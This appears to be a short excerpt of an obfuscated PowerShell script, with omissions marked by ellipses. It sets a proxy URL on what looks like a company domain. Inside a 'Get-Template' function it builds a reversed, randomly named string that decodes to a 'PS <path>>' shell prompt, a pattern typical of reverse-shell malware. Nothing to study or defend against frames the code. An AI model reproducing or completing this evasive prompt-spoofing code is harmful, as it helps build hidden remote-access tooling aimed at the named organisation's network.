...
$proxyUrl = "http://proxypac.hm.com:8080/proxy.pac"
...
Function Get-Template () {
    ...
    $odTPYnuuGIGzrAeHM += ';"SP","TAHW" ecalper- htaP.)noitacol-teg(,"EREHW" ecalper- " >EREHW TAHW" + hf71Yew0EGvSOH6QuqGdrAC$ = Hsas321312DASasda$'
